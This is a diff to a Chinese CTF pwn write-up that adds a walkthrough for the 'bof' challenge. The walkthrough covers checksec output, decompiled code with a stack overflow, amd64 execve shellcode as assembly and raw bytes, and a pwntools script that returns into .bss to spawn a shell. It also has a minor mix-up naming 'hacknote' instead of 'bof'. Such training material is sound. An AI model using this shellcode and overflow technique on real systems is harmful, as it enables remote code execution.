@@ -2459,7 +2459,7 @@ mov al, 0xb     ; eax置为execve()函数的中断号
 int 0x80        ; 调用syscall()函数软中断
 ```
 
-编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，一共有三种写法。
+编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，`i386`架构下的`shellcode`一共有三种写法。
 
 ```python
 shellcode = '''
@@ -2736,6 +2736,129 @@ from pwn import *
 context(arch = 'amd64', os = 'linux',log_level = 'debug')
 io = remote('redirect.do-not-trust.hacking.run', 10021)
 io.sendline(asm(shellcraft.sh()))
+io.interactive()
+```
+
+------
+
+### [bof](https://ce.pwnthebox.com/challenges?id=945)
+
+先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./bof                 
+./bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d52165d6e0b268def0e0344ffa9e9e5247f1a9e2, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./bof                 
+[*] '/home/tyd/ctf/pwn/pwnthebox/bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0LL);
+  setbuf(_bss_start, 0LL);
+  puts("Greetings! Have fun with Xp0int!");
+  puts("Your name: ");
+  read(0, &NAME, 0x18uLL);
+  fun1();
+  return 0;
+}
+```
+
+`NAME`变量存放在`.bss`段上，程序存在栈溢出漏洞且未开启`NX`防护，可以通过`read()`函数向`.bss`段写入`0x18`字节的`shellcode`。
+
+双击`NAME`变量可以看到其起始地址为`0x404070`。
+
+```assembly
+.bss:0000000000404070                 public NAME
+.bss:0000000000404070 NAME            db    ? ;               ; DATA XREF: main+50↑o
+.........
+.bss:0000000000404087 _bss            ends
+```
+
+`fun1()`函数详情如下：
+
+```c
+ssize_t __fastcall fun1(__int64 a1, const char *a2)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  printf("Well, %s this is a simple one.(*_*)\n", a2);
+  return read(0, buf, 0x30uLL);
+}
+```
+
+双击`buf`变量可以查看大致栈结构，我们需要`0x20`个字节来覆盖`padding`，`fake rbp`还需要`0x8`个字节覆盖到栈帧底部。
+
+```assembly
+-0000000000000020 ; D/A/*   : change type (data/ascii/array)
+-0000000000000020 ; N       : rename
+-0000000000000020 ; U       : undefine
+-0000000000000020 ; Use data definition commands to create local variables and function arguments.
+-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
+-0000000000000020 ;
+-0000000000000020
+-0000000000000020 buf             db 32 dup(?)
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+`amd64`架构的`shellcode`汇编代码如下：
+
+```assembly
+xor rax,rax
+xor rdi,rdi
+mov rdi ,0x68732f6e69622f ; 将'/bin/sh'传递给rdi
+push rdi                  ; 将'/bin/sh'压入栈
+push rsp                 
+pop rdi
+xor rsi,rsi
+xor rdx,rdx
+push 0x3b                 ; 系统调用号
+pop rax
+syscall
+```
+
+然而它超过了`0x18`字节，科学上网找了个简短的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10025`，发送`payload`即可得到`PTB{ecfca74a-376c-4e71-8e09-da5cf5c3f024}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10025)
+address = 0x404070
+shellcode = '''
+xor rax,rax
+xor rdi,rdi
+mov rdi ,0x68732f6e69622f
+push rdi              
+push rsp                 
+pop rdi
+xor rsi,rsi
+xor rdx,rdx
+push 0x3b   
+pop rax
+syscall
+'''
+print(len(asm(shellcode))) # 30 超过了0x18 重新写
+shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
+io.sendline(shellcode)
+payload = b'a'*(0x20+0x8)+p64(address)
+io.sendline(payload)
 io.interactive()
 ```
 
